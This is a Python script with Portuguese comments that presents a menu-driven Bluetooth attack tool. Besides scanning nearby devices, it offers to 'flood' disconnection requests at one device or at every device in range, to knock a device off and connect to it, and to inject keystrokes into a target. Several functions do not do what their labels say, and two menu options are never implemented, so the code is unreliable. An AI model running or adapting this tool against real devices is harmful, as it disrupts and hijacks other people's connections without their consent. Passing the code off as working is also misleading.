import subprocess
import bluetooth
import pyautogui

# Função para exibir as opções de comando disponíveis
def exibir_opcoes():
    print("Opções disponíveis:")
    print("1. Exibir dispositivos locais")
    print("2. Consultar dispositivos remotos (exibe endereço, offset de clock e classe)")
    print("3. Consultar dispositivos remotos (exibe nome do dispositivo)")
    print("4. Exibir nome do dispositivo remoto com o endereço bdaddr")
    print("5. Exibir nome, versão e recursos suportados do dispositivo remoto com o endereço bdaddr")
    print("6. Iniciar processo de consulta periódica (sem exibir resultados)")
    print("7. Encerrar processo de consulta periódica")
    print("8. Realizar o flood de desconexão em um dispositivo específico")
    print("9. Realizar o flood de desconexão em todos os dispositivos próximos")
    print("10. Desconectar um dispositivo específico e se conectar a ele")
    print("11. Enviar keystrokes para dispositivo")
    print("0. Sair")

# Executar o comando hciconfig com base nos argumentos fornecidos
def executar_comando(args):
    try:
        output = subprocess.check_output(["hciconfig"] + args, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print("Ocorreu um erro ao executar o comando:", e)

# Função para obter o endereço IP do dispositivo
def get_device_ip():
    device_ip = subprocess.check_output(["hostname", "-I"], text=True).strip()
    return device_ip

# Realiza o "flood" de solicitações de desconexão para um dispositivo específico
def flood_disconnect_single(device_address):
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((device_address, 1))
        sock.close()
        print(f"Dispositivo {device_address} desconectado com sucesso.")
    except Exception as e:
        print(f"Erro ao desconectar dispositivo {device_address}: {str(e)}")

# Função para desconectar um dispositivo Bluetooth
def disconnect_device(device_address):
    try:
        subprocess.run(["hcitool", "dc", device_address], check=True)
        print(f"Dispositivo {device_address} desconectado com sucesso.")
    except subprocess.CalledProcessError as e:
        print(f"Erro ao desconectar dispositivo {device_address}: {str(e)}")

# Função para enviar keystrokes para um dispositivo
def enviar_keystrokes(device_address, keystrokes):
    try:
        subprocess.run(["bluetoothctl", "trust", device_address], check=True)
        subprocess.run(["bluetoothctl", "connect", device_address], check=True)
        print(f"Conectado ao dispositivo {device_address} com sucesso.")
        pyautogui.typewrite(keystrokes)
    except subprocess.CalledProcessError as e:
        print(f"Erro ao se conectar ao dispositivo {device_address}: {str(e)}")

# Loop principal
while True:
    exibir_opcoes()
    escolha = input("Escolha uma opção: ")

    if escolha == "1":
        executar_comando([])

    elif escolha == "2":
        executar_comando(["inq"])

    elif escolha == "3":
        executar_comando(["scan"])

    elif escolha == "4":
        dispositivos = bluetooth.discover_devices()
        print("Dispositivos pareados:")
        for i, dispositivo in enumerate(dispositivos):
            print(f"{i+1}. {dispositivo} - {bluetooth.lookup_name(dispositivo)}")
        dispositivo_choice = int(input("Escolha o número do dispositivo para exibir o nome: "))
        if dispositivo_choice >= 1 and dispositivo_choice <= len(dispositivos):
            dispositivo = dispositivos[dispositivo_choice - 1]
            print("Nome do dispositivo:", bluetooth.lookup_name(dispositivo))
        else:
            print("Escolha inválida. Por favor, escolha um número válido.")

    elif escolha == "5":
        dispositivos = bluetooth.discover_devices()
        print("Dispositivos pareados:")
        for i, dispositivo in enumerate(dispositivos):
            print(f"{i+1}. {dispositivo} - {bluetooth.lookup_name(dispositivo)}")
        dispositivo_choice = int(input("Escolha o número do dispositivo para exibir as informações: "))
        if dispositivo_choice >= 1 and dispositivo_choice <= len(dispositivos):
            dispositivo = dispositivos[dispositivo_choice - 1]
            print("Informações do dispositivo:")
            subprocess.run(["hcitool", "info", dispositivo])

    elif escolha == "8":
        dispositivos = bluetooth.discover_devices()
        print("Dispositivos próximos:")
        for i, dispositivo in enumerate(dispositivos):
            print(f"{i+1}. {dispositivo} - {bluetooth.lookup_name(dispositivo)}")
        dispositivo_choice = int(input("Escolha o número do dispositivo para realizar o flood: "))
        if dispositivo_choice >= 1 and dispositivo_choice <= len(dispositivos):
            dispositivo = dispositivos[dispositivo_choice - 1]
            flood_disconnect_single(dispositivo)
        else:
            print("Escolha inválida. Por favor, escolha um número válido.")

    elif escolha == "9":
        dispositivos = bluetooth.discover_devices()
        for dispositivo in dispositivos:
            flood_disconnect_single(dispositivo)

    elif escolha == "10":
        device_address = input("Digite o endereço bdaddr do dispositivo: ")
        disconnect_device(device_address)
        try:
            subprocess.run(["bluetoothctl", "connect", device_address], check=True)
            print(f"Conectado ao dispositivo {device_address} com sucesso.")
        except subprocess.CalledProcessError as e:
            print(f"Erro ao se conectar ao dispositivo {device_address}: {str(e)}")

    elif escolha == "11":
        device_address = input("Digite o endereço bdaddr do dispositivo: ")
        keystrokes = input("Digite as keystrokes para enviar ao dispositivo: ")
        enviar_keystrokes(device_address, keystrokes)

    elif escolha == "0":
        break

    else:
        print("Opção inválida. Por favor, escolha uma opção válida.")

# Obtém o endereço IP do dispositivo
device_ip = get_device_ip()
print("Endereço IP do dispositivo:", device_ip)

